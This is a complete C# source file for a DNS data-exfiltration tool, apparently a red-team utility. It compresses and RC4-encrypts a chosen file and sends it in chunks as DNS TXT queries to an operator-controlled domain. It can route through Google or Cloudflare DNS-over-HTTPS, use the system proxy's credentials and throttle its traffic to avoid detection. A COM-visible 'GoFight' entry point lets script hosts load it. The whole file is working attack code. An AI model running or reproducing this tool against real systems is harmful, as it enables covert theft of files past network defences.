using System;
using System.Net;
using System.Web.Script.Serialization;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Linq;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Threading;
	
namespace DNSExfil
{
	
	[ComVisible(true)]
	public class DNSExfil
	{	
		
		public DNSExfil()
        {
        }
		
		private static void PrintUsage()
		{

		}
		
		public static void PrintColor(string text)
		{
			if (text.StartsWith("[!]")) { Console.ForegroundColor = ConsoleColor.Red;}
			else if (text.StartsWith("[+]")) { Console.ForegroundColor = ConsoleColor.Green;}
			else if (text.StartsWith("[*]")) { Console.ForegroundColor = ConsoleColor.Blue;}
			
			Console.WriteLine(text);
			
			// Reset font color
			Console.ForegroundColor = ConsoleColor.White;
		}
		

		private static string ToBase64URL(byte[] data)
		{
			string result = String.Empty;
			
			result = Convert.ToBase64String(data).Replace("=","").Replace("/","_").Replace("+","-");
			return result;
		}
		
	
		private static string ToBase32(byte[] data)
		{
			string result = String.Empty;
			
			result = Base32.ToBase32String(data).Replace("=","");
			return result;
		}
		
		public void GoFight(string args)
		{
			Main(args.Split('|'));
		}
		
        public static void Main(string[] args)
        {
			// Mandatory parameters
			string filePath = String.Empty;
			string domainName = String.Empty;
			string password = String.Empty;

			// Optionnal parameters
			string fileName = String.Empty;
			bool useBase32 = false; // Whether or not to use Base32 for data encoding
			bool useDoH = false; // Whether or not to use DoH for name resolution
			string dohProvider = String.Empty; // Which DoH server to use: google or cloudflare
			string dnsServer = null;
			int throttleTime = 0;
			string data = String.Empty;
			string request = String.Empty;
			int requestMaxSize = 255; // DNS request max size = 255 bytes
			int labelMaxSize = 63; // DNS request label max size = 63 chars
			
			//--------------------------------------------------------------
			// Perform arguments checking
			if(args.Length < 3) {
				PrintColor("[!] Missing arguments");
				PrintUsage();
				return;
			}
			
			filePath = args[0];
			domainName = args[1];
			password = args[2];
			fileName = Path.GetFileName(filePath);
			
			if (!File.Exists(filePath)) {
				PrintColor(String.Format("[!] File not found: {0}",filePath));
				return;
			}
			
			// Do we have additionnal arguments ?
			if (new[] {4, 5, 6, 7}.Contains(args.Length)) {
				int i = 3;
				int param;
				while (i < args.Length) {
					if (args[i].StartsWith("s=")) {
						dnsServer = args[i].Split('=')[1];
						PrintColor(String.Format("[*] Working with DNS server [{0}]", dnsServer));
					}
					else if (args[i].StartsWith("t=")) {
						throttleTime = Convert.ToInt32(args[i].Split('=')[1]);
						PrintColor(String.Format("[*] Setting throttle time to [{0}] ms", throttleTime));
					}
					else if (args[i].StartsWith("r=")) {
						param = Convert.ToInt32(args[i].Split('=')[1]);
						if (param < 255) { requestMaxSize = param; }
						PrintColor(String.Format("[*] Setting DNS request max size to [{0}] bytes", requestMaxSize));
					}
					else if (args[i].StartsWith("l=")) {
						param = Convert.ToInt32(args[i].Split('=')[1]);
						if (param < 63) { labelMaxSize = param; }
						PrintColor(String.Format("[*] Setting label max size to [{0}] chars", labelMaxSize));
					}
					else if (args[i].StartsWith("h=")) {
						dohProvider = args[i].Split('=')[1];
						if (dohProvider.Equals("google") || dohProvider.Equals("cloudflare")) {
							if (dohProvider.Equals("cloudflare")) {useBase32 = true;} 
							useDoH = true;
							PrintColor("[*] Using DNS over HTTP for name resolution.");
						}
						else {
							PrintColor(String.Format("[!] Error with DoH parameter."));
							PrintUsage();
							return;
						}
					}
					else if (args[i] == "-b32") {
						useBase32 = true;
					}
					i++;
				}
			}
			
			//--------------------------------------------------------------
			// Compress and encrypt the file in memory
			PrintColor(String.Format("[*] Compressing (ZIP) the [{0}] file in memory",filePath));
			using (var zipStream = new MemoryStream())
			{
				using (var archive = new ZipArchive(zipStream, ZipArchiveMode.Create, true))
				{
					var entryFile = archive.CreateEntry(fileName);
					using (var entryStream = entryFile.Open())
					using (var streamWriter = new BinaryWriter(entryStream))
					{
						streamWriter.Write(File.ReadAllBytes(filePath));
					}
				}

				zipStream.Seek(0, SeekOrigin.Begin);
				PrintColor(String.Format("[*] Encrypting the ZIP file with password [{0}]",password));
				
				if (useBase32) {
					PrintColor("[*] Encoding the data with Base32");
					data = ToBase32(RC4Encrypt.Encrypt(Encoding.UTF8.GetBytes(password),zipStream.ToArray()));
				}
				else {
					PrintColor("[*] Encoding the data with Base64URL");
					data = ToBase64URL(RC4Encrypt.Encrypt(Encoding.UTF8.GetBytes(password),zipStream.ToArray()));
				}
				
				PrintColor(String.Format("[*] Total size of data to be transmitted: [{0}] bytes", data.Length));
			}
			
			int bytesLeft = requestMaxSize - 10 - (domainName.Length+2); // domain name space usage in bytes
			
			int nbFullLabels = bytesLeft/(labelMaxSize+1);
			int smallestLabelSize = bytesLeft%(labelMaxSize+1) - 1;
			int chunkMaxSize = nbFullLabels*labelMaxSize + smallestLabelSize;
			int nbChunks = data.Length/chunkMaxSize + 1;
			PrintColor(String.Format("[+] Maximum data exfiltrated per DNS request (chunk max size): [{0}] bytes", chunkMaxSize));
			PrintColor(String.Format("[+] Number of chunks: [{0}]", nbChunks));
			
			//--------------------------------------------------------------
			// Send the initial request advertising the fileName and the total number of chunks, with Base32 encoding in all cases
			if (useBase32) {
				request = "init." + ToBase32(Encoding.UTF8.GetBytes(String.Format("{0}|{1}",fileName, nbChunks))) + ".base32." + domainName;
			}
			else {
				request = "init." + ToBase32(Encoding.UTF8.GetBytes(String.Format("{0}|{1}",fileName, nbChunks))) + ".base64." + domainName;
			}
			
			PrintColor("[*] Sending...");

			string reply = String.Empty;
			try {
				reply = Resolver.GetRecord(request,dnsServer);
				
				if (reply != "OK") {
					return;
				}
			}
			catch (Win32Exception e) {

				return;
			}

			PrintColor("[*] Sending more");
			
			string chunk = String.Empty;
			int chunkIndex = 0;
			int countACK;
			
			for (int i = 0; i < data.Length;) {
				// Get a first chunk of data to send
				chunk = data.Substring(i, Math.Min(chunkMaxSize, data.Length-i));
				int chunkLength = chunk.Length;

				// First part of the request is the chunk number
				request = chunkIndex.ToString() + ".";
				
				// Then comes the chunk data, split into sublabels
				int j = 0;
				while (j*labelMaxSize < chunkLength) {
					request += chunk.Substring(j*labelMaxSize, Math.Min(labelMaxSize, chunkLength-(j*labelMaxSize))) + ".";
					j++;
				}

				// Eventually comes the top level domain name
				request += domainName;
				
				// Send the request
				try {
					if (useDoH) { reply = DOHResolver.GetRecord(dohProvider, request); }
					else { reply = Resolver.GetRecord(request,dnsServer); }
					
					countACK = Convert.ToInt32(reply);
					
					if (countACK != chunkIndex) {
						PrintColor(String.Format("[!] Chunk number [{0}] lost.\nResending.", countACK));
					}
					else {
						i += chunkMaxSize;
						chunkIndex++;
					}
				}
				catch (Win32Exception e) {
					PrintColor(String.Format("[!] Unexpected exception occured: [{0}]",e.Message));
					return;
				}
				
				// Apply throttle if requested
				if (throttleTime != 0) {
					Thread.Sleep(throttleTime);
				}
			}
			
			PrintColor("[*] DONE !");
		} // End Main
		
	}

	public class RC4Encrypt
	{
		public static byte[] Encrypt(byte[] key, byte[] data)
		{
			return EncryptOutput(key, data).ToArray();
		}

		private static byte[] EncryptInitalize(byte[] key)
		{
			byte[] s = Enumerable.Range(0, 256)
			.Select(i => (byte)i)
			.ToArray();

			for (int i = 0, j = 0; i < 256; i++) {
				j = (j + key[i % key.Length] + s[i]) & 255;
				Swap(s, i, j);
			}

			return s;
		}
   
		private static System.Collections.Generic.IEnumerable<byte> EncryptOutput(byte[] key, System.Collections.Generic.IEnumerable<byte> data)
		{
				byte[] s = EncryptInitalize(key);
				int i = 0;
				int j = 0;

				return data.Select((b) =>
				{
					i = (i + 1) & 255;
					j = (j + s[i]) & 255;
					Swap(s, i, j);

					return (byte)(b ^ s[(s[i] + s[j]) & 255]);
				});
		}

		private static void Swap(byte[] s, int i, int j)
		{
			byte c = s[i];
			s[i] = s[j];
			s[j] = c;
		}
	}	

	public class Question
	{
		public string name { get; set; }
		public int type { get; set; }
	}
	public class Answer
	{
		public string name { get; set; }
		public int type { get; set; }
		public int TTL { get; set; }
		public string data { get; set; }
	}
	public class Response
	{
		public int Status { get; set; }
		public bool TC { get; set; }
		public bool RD { get; set; }
		public bool RA { get; set; }
		public bool AD { get; set; }
		public bool CD { get; set; }
		public List<Question> Question { get; set; }
		public List<Answer> Answer { get; set; }
	}
	
    public class DOHResolver
    {
		
		static string googleDOHURI = " https://dns.google.com/resolve?name="; // https://developers.google.com/speed/public-dns/docs/dns-over-https
		static string cloudflareDOHURI = "https://cloudflare-dns.com/dns-query?ct=application/dns-json&name="; // https://developers.cloudflare.com/1.1.1.1/dns-over-https/wireformat/
		
		public static string GetRecord(string dohProvider, string domain)
		{
			string dohQuery = String.Empty;
			
			if (dohProvider.Equals("google")) {
				dohQuery = googleDOHURI + domain + "&type=TXT";
			}
			else if (dohProvider.Equals("cloudflare")) {
				dohQuery = cloudflareDOHURI + domain + "&type=TXT";
			}

			//------------------------------------------------------------------
			// Perform the DOH request to the server
			WebClient webClient = new WebClient(); // WebClient object to communicate with the DOH server
			
            //---- Check if an HTTP proxy is configured on the system, if so, use it
            IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
            if (defaultProxy != null)
            {
                defaultProxy.Credentials = CredentialCache.DefaultCredentials;
                webClient.Proxy = defaultProxy;
            }
			
			string responsePacket = String.Empty;
			responsePacket = webClient.DownloadString(dohQuery);
			responsePacket = responsePacket.Replace("\\\"",""); // Replies with "data": "\"OK\"" causes JSON parsing to fail because of the uneeded escaped double-quote  
			var responseObject = new JavaScriptSerializer().Deserialize<Response>(responsePacket);
			
			if (responseObject.Answer.Count >= 1) {
					return responseObject.Answer[0].data;
			}
			else {
				throw new Win32Exception("DNS answer does not contain a TXT resource record.");
			}
			
		}
	}

    public class Resolver
    {       
		
        [DllImport("dnsapi", EntryPoint="DnsQuery_W", CharSet=CharSet.Unicode, SetLastError=true, ExactSpelling=true)]
        private static extern int DnsQuery([MarshalAs(UnmanagedType.VBByRefStr)]ref string pszName, DnsRecordTypes wType, DnsQueryOptions options, ref IP4_ARRAY dnsServerIpArray, ref IntPtr ppQueryResults, int pReserved);

        [DllImport("dnsapi", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern void DnsRecordListFree(IntPtr pRecordList, int FreeType);
		
		
        public static string GetRecord(string domain, string serverIP = null)
        {
			IntPtr recordsArray = IntPtr.Zero;
			IntPtr dnsRecord = IntPtr.Zero;
            TXTRecord txtRecord;
			IP4_ARRAY dnsServerArray = new IP4_ARRAY();
			
			if (serverIP != null) {
				uint address = BitConverter.ToUInt32(IPAddress.Parse(serverIP).GetAddressBytes(), 0);
				uint[] ipArray = new uint[1];
				ipArray.SetValue(address, 0);
				dnsServerArray.AddrCount = 1;
				dnsServerArray.AddrArray = new uint[1];
				dnsServerArray.AddrArray[0] = address;
			}
           
			if (Environment.OSVersion.Platform != PlatformID.Win32NT)
            {
                throw new NotSupportedException();
            }
			
			ArrayList recordList = new ArrayList();
			try
			{
				int queryResult = Resolver.DnsQuery(ref domain, DnsRecordTypes.DNS_TYPE_TXT, DnsQueryOptions.DNS_QUERY_BYPASS_CACHE, ref dnsServerArray, ref recordsArray, 0);
				

				if (queryResult != 0)
				{
					throw new Win32Exception(queryResult);
				}
				
				for (dnsRecord = recordsArray; !dnsRecord.Equals(IntPtr.Zero); dnsRecord = txtRecord.pNext)
				{
					txtRecord = (TXTRecord) Marshal.PtrToStructure(dnsRecord, typeof(TXTRecord));
					if (txtRecord.wType == (int)DnsRecordTypes.DNS_TYPE_TXT)
					{
						string txt = Marshal.PtrToStringAuto(txtRecord.pStringArray);
						recordList.Add(txt);
					}
				}
			}
			finally
			{
				Resolver.DnsRecordListFree(recordsArray, 0);
			}
			
			// Return only the first TXT answer
			return (string)recordList[0];
		}

		public struct IP4_ARRAY
		{
			/// DWORD->unsigned int
			public UInt32 AddrCount;
			/// IP4_ADDRESS[1]
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1, ArraySubType = UnmanagedType.U4)] public UInt32[] AddrArray;
		}
		
		[StructLayout(LayoutKind.Sequential)]
        private struct TXTRecord
        {
			// Generic DNS record structure
            public IntPtr pNext;
            public string pName;
            public short wType;
            public short wDataLength;
            public int flags;
            public int dwTtl;
            public int dwReserved;
            
			// TXT record specific
			public int dwStringCount;
            public IntPtr pStringArray;
            
        }
		
		[Flags]
		private enum DnsQueryOptions
		{
			DNS_QUERY_STANDARD = 0x0,
			DNS_QUERY_ACCEPT_TRUNCATED_RESPONSE = 0x1,
			DNS_QUERY_USE_TCP_ONLY = 0x2,
			DNS_QUERY_NO_RECURSION = 0x4,
			DNS_QUERY_BYPASS_CACHE = 0x8,
			DNS_QUERY_NO_WIRE_QUERY = 0x10,
			DNS_QUERY_NO_LOCAL_NAME = 0x20,
			DNS_QUERY_NO_HOSTS_FILE = 0x40,
			DNS_QUERY_NO_NETBT = 0x80,
			DNS_QUERY_WIRE_ONLY = 0x100,
			DNS_QUERY_RETURN_MESSAGE = 0x200,
			DNS_QUERY_MULTICAST_ONLY = 0x400,
			DNS_QUERY_NO_MULTICAST = 0x800,
			DNS_QUERY_TREAT_AS_FQDN = 0x1000,
			DNS_QUERY_ADDRCONFIG = 0x2000,
			DNS_QUERY_DUAL_ADDR = 0x4000,
			DNS_QUERY_MULTICAST_WAIT = 0x20000,
			DNS_QUERY_MULTICAST_VERIFY = 0x40000,
			DNS_QUERY_DONT_RESET_TTL_VALUES = 0x100000,
			DNS_QUERY_DISABLE_IDN_ENCODING = 0x200000,
			DNS_QUERY_APPEND_MULTILABEL = 0x800000,
			DNS_QUERY_RESERVED = unchecked((int)0xF0000000)
		}


		private enum DnsRecordTypes
		{
			DNS_TYPE_A = 0x1,
			DNS_TYPE_NS = 0x2,
			DNS_TYPE_MD = 0x3,
			DNS_TYPE_MF = 0x4,
			DNS_TYPE_CNAME = 0x5,
			DNS_TYPE_SOA = 0x6,
			DNS_TYPE_MB = 0x7,
			DNS_TYPE_MG = 0x8,
			DNS_TYPE_MR = 0x9,
			DNS_TYPE_NULL = 0xA,
			DNS_TYPE_WKS = 0xB,
			DNS_TYPE_PTR = 0xC,
			DNS_TYPE_HINFO = 0xD,
			DNS_TYPE_MINFO = 0xE,
			DNS_TYPE_MX = 0xF,
			DNS_TYPE_TEXT = 0x10,       // This is how it's specified on MSDN
			DNS_TYPE_TXT = DNS_TYPE_TEXT,
			DNS_TYPE_RP = 0x11,
			DNS_TYPE_AFSDB = 0x12,
			DNS_TYPE_X25 = 0x13,
			DNS_TYPE_ISDN = 0x14,
			DNS_TYPE_RT = 0x15,
			DNS_TYPE_NSAP = 0x16,
			DNS_TYPE_NSAPPTR = 0x17,
			DNS_TYPE_SIG = 0x18,
			DNS_TYPE_KEY = 0x19,
			DNS_TYPE_PX = 0x1A,
			DNS_TYPE_GPOS = 0x1B,
			DNS_TYPE_AAAA = 0x1C,
			DNS_TYPE_LOC = 0x1D,
			DNS_TYPE_NXT = 0x1E,
			DNS_TYPE_EID = 0x1F,
			DNS_TYPE_NIMLOC = 0x20,
			DNS_TYPE_SRV = 0x21,
			DNS_TYPE_ATMA = 0x22,
			DNS_TYPE_NAPTR = 0x23,
			DNS_TYPE_KX = 0x24,
			DNS_TYPE_CERT = 0x25,
			DNS_TYPE_A6 = 0x26,
			DNS_TYPE_DNAME = 0x27,
			DNS_TYPE_SINK = 0x28,
			DNS_TYPE_OPT = 0x29,
			DNS_TYPE_DS = 0x2B,
			DNS_TYPE_RRSIG = 0x2E,
			DNS_TYPE_NSEC = 0x2F,
			DNS_TYPE_DNSKEY = 0x30,
			DNS_TYPE_DHCID = 0x31,
			DNS_TYPE_UINFO = 0x64,
			DNS_TYPE_UID = 0x65,
			DNS_TYPE_GID = 0x66,
			DNS_TYPE_UNSPEC = 0x67,
			DNS_TYPE_ADDRS = 0xF8,
			DNS_TYPE_TKEY = 0xF9,
			DNS_TYPE_TSIG = 0xFA,
			DNS_TYPE_IXFR = 0xFB,
			DNS_TYPE_AFXR = 0xFC,
			DNS_TYPE_MAILB = 0xFD,
			DNS_TYPE_MAILA = 0xFE,
			DNS_TYPE_ALL = 0xFF,
			DNS_TYPE_ANY = 0xFF,
			DNS_TYPE_WINS = 0xFF01,
			DNS_TYPE_WINSR = 0xFF02,
			DNS_TYPE_NBSTAT = DNS_TYPE_WINSR
		}
    }
	
	internal sealed class Base32
    {

        private const int InByteSize = 8;

        private const int OutByteSize = 5;

        private const string Base32Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

        internal static string ToBase32String(byte[] bytes)
        {

            if (bytes == null)
            {
                return null;
            }

            else if (bytes.Length == 0)
            {
                return string.Empty;
            }

            StringBuilder builder = new StringBuilder(bytes.Length * InByteSize / OutByteSize);

            int bytesPosition = 0;

            int bytesSubPosition = 0;

            byte outputBase32Byte = 0;

            int outputBase32BytePosition = 0;

            while (bytesPosition < bytes.Length)
            {

                int bitsAvailableInByte = Math.Min(InByteSize - bytesSubPosition, OutByteSize - outputBase32BytePosition);

                outputBase32Byte <<= bitsAvailableInByte;

                outputBase32Byte |= (byte)(bytes[bytesPosition] >> (InByteSize - (bytesSubPosition + bitsAvailableInByte)));

                bytesSubPosition += bitsAvailableInByte;

                if (bytesSubPosition >= InByteSize)
                {
                    bytesPosition++;
                    bytesSubPosition = 0;
                }

                outputBase32BytePosition += bitsAvailableInByte;

                if (outputBase32BytePosition >= OutByteSize)
                {
                    outputBase32Byte &= 0x1F;  

                    builder.Append(Base32Alphabet[outputBase32Byte]);

                    outputBase32BytePosition = 0;
                }
            }

            if (outputBase32BytePosition > 0)
            {
                outputBase32Byte <<= (OutByteSize - outputBase32BytePosition);

                outputBase32Byte &= 0x1F;

                builder.Append(Base32Alphabet[outputBase32Byte]);
            }

            return builder.ToString();
        }
    }
}